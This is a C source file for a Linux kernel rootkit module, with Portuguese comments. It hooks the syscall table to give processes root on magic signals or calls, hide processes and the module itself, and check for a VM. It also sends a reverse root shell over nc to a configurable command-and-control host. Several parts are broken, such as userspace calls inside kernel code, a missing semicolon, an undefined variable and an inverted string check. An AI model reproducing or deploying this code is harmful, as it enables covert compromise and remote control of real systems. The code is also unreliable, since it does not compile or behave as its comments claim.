//ring - km (ring 0) rootkit for linux kernel 2.x/3.x/4.x/5.x/6.x
//written by gbr
//tenha muito cuidado ao editar algo ou copiar, nem eu mesmo sei e entendo o que fiz aqui!
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/stat.h>
#include <linux/kmod.h>
#include <linux/moduleparam.h>
#include <linux/version.h> 
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/module.h>
#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif
#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};
#endif

MODULE_AUTHOR("gbr");
MODULE_LICENSE("GPL");

//config to backdoor function
static char *c2 = "PIROCA=127.0.0.1"; //change 127.0.0.1 to your c2 ip address
module_param(c2, charp, 0000);
static char *porta = "XERECA=1533"; //change 1533 to your c2 port
module_param(porta, charp, 0000);

//sinais pro kill
enum {
	SUPERMAN  = 61, //kill -61 0   -- muda credenciais do processo (faz virar root)
	INVISIVEL = 62, //kill -62 pid -- esconde processo
	ESCONDE   = 63, //kill -63 0   -- esconde o lkm
	REV       = 64, //kill -64 0   -- manda uma rootshell pra C2:PORTA definida ai em cima
	VMZIN     = 65, //kill -65 0   -- verifica se ta numa vm ou numa maquina fisica
}

//syscalls hookadas
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static unsigned long *__sys_call_table;
static t_syscall scc;
static t_syscall sch;
static t_syscall sco;
static t_syscall pica;
static struct list_head *module_previous;
static short escondidin = 0x00;

unsigned long *leeto_pgstb(void) {
    unsigned long *syscall_table;
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    return syscall_table;
}

 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0)
 static inline void __write_cr0(unsigned long cr0) {
     asm volatile("mov %0,%%cr0" : "+r"(cr0) : : "memory");
 }
 #else
 #define __write_cr0 write_cr0
 #endif

static void ehumavm(void) { //check if were in a vm or a physical machine using a shitty method
    int vm = 0x00;
        if(sysconf(_SC_NPROCESSORS_ONLN) <= 0x01) vm++;
        char gete[0x80];
        FILE *comando = popen("dmesg |grep -i hypervisor", "r");
        if(fgets(gete, 0x80, comando) != NULL) {
            char grep[0x23];
            strncpy(grep, "[   0.000000 Hypervisor detected]", 0x22);
            grep[0x22] = '\0';
            if(strcmp("[   0.000000 Hypervisor detected]", grep) == 0x00) vm++;
        }
        if(vm<=0x03) printf("we are in a physical machine\x0d\x0a");
        else           printf("VM DETECTED!!!\x0d\x0a");
}

static void cback(void) { //warning: superleet backdoor function!!!!11
	char *var[] = {
		"HOME=/root",
		"TERM=xterm256-color",
		c2,
		porta,
		NULL
	};
	char *cmdddd[] = {
		"/bin/bash",
		"-c",
		"/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc $PIROCA $XERECA >/tmp/f",
		NULL
	};
	call_usermodehelper(argv[0x00],cmdddd,var,UMH_WAIT_EXEC);
	return 0x00;
}

 static void acr0(void) {
     unsigned long cr0 = read_cr0();
     set_bit(16, &cr0);
     __write_cr0(cr0);
 }

 static void dcr0(void) {
     unsigned long cr0 = read_cr0();
     clear_bit(16, &cr0);
     __write_cr0(cr0);
 }

static inline void achou(void) {
    list_add(&THIS_MODULE->list, module_previous);
    escondidin = 0x00;
}

static inline void escondelista(void) {
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    escondidin = 0x01;
}

struct task_struct *achapr(pid_t pid) {
    struct task_struct *p = current;
    for_each_process(p) {
        if(p->pid == pid) return p;
    }
    return NULL;
}

static inline void mcredproc(void) {
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid   = current->gid   = 0x00;
		current->euid  = current->egid  = 0x00;
		current->suid  = current->sgid  = 0x00;
		current->fsuid = current->fsgid = 0x00;
	#else
		struct cred *credenciaisfoda;
		credenciaisfoda = prepare_creds();
		if(credenciaisfoda == NULL) return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			credenciaisfoda->uid.val   = credenciaisfoda->gid.val   = 0x00;
			credenciaisfoda->euid.val  = credenciaisfoda->egid.val  = 0x00;
			credenciaisfoda->suid.val  = credenciaisfoda->sgid.val  = 0x00;
			credenciaisfoda->fsuid.val = credenciaisfoda->fsgid.val = 0x00;
		#else
			credenciaisfoda->uid   = credenciaisfoda->gid   = 0x00;
			credenciaisfoda->euid  = credenciaisfoda->egid  = 0x00;
			credenciaisfoda->suid  = credenciaisfoda->sgid  = 0x00;
			credenciaisfoda->fsuid = credenciaisfoda->fsgid = 0x00;
		#endif
		commit_creds(credenciaisfoda);
	#endif
}

asmlinkage int hookadona(const struct pt_regs *pt_regs) {
    pid_t pid = (pid_t)pt_regs->di;
    int sinal = (int)pt_regs->si;
    struct task_struct *task;
    switch(sinal) {
	case VMZIN:
            ehumavm();
	    break;
    	case REV:
	    cback();
    	    break;
        case INVISIVEL:
            if((task = achapr(pid)) == NULL) return -ESRCH;
            task->flags ^= PF_INVISIBLE;
            break;
        case SUPERMAN:
            mcredproc();
            break;
        case ESCONDE:
            if(escondidin) achou();
            else escondelista();
            break;
        default:
            return pica(pt_regs);
        break;
    }
    return 0x00;
}

asmlinkage int cd(const struct pt_regs *pt_regs) {
    unsigned int mode = (unsigned int) pt_regs->si;
    if(mode == 777) mcredproc();
    return sch(pt_regs);
}

asmlinkage int hookzdeleve(const struct pt_regs *pt_regs) {
    unsigned int user_id = (unsigned int)pt_regs->si;
    if(user_id == 0x00) mcredproc();
    return scc(pt_regs);
}

asmlinkage int hookoat(const struct pt_regs *pt_regs) {
    const char * file_name = (const char *) pt_regs->si;
    if(file_name)
        if(strcmp(file_name, "givemeroot.txt")) mcredproc();
    return sco(pt_regs);
}

static int __init carrega(void) {
    __sys_call_table = leeto_pgstb();
    if(!__sys_call_table) return -0x01;
    escondelista();
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    scc = (t_syscall)__sys_call_table[__NR_chown];
    sch = (t_syscall)__sys_call_table[__NR_chmod];
    sco = (t_syscall)__sys_call_table[__NR_open];
    pica = (t_syscall)__sys_call_table[__NR_kill];
    dcr0();
    __sys_call_table[__NR_chown] = (unsigned long)hookzdeleve;
    __sys_call_table[__NR_chmod] = (unsigned long)cd;
    __sys_call_table[__NR_openat] = (unsigned long)hookoat;
    __sys_call_table[__NR_kill] = (unsigned long)hookadona;
    acr0();
    return 0x00;
}

static void __exit flw(void) {
    dcr0();
    __sys_call_table[__NR_chown] = (unsigned long)scc;
    __sys_call_table[__NR_chmod] = (unsigned long)sch;
    __sys_call_table[__NR_openat] = (unsigned long)sco;
    __sys_call_table[__NR_kill] = (unsigned long)pica;
    acr0();
}

module_init(carrega);
module_exit(flw);
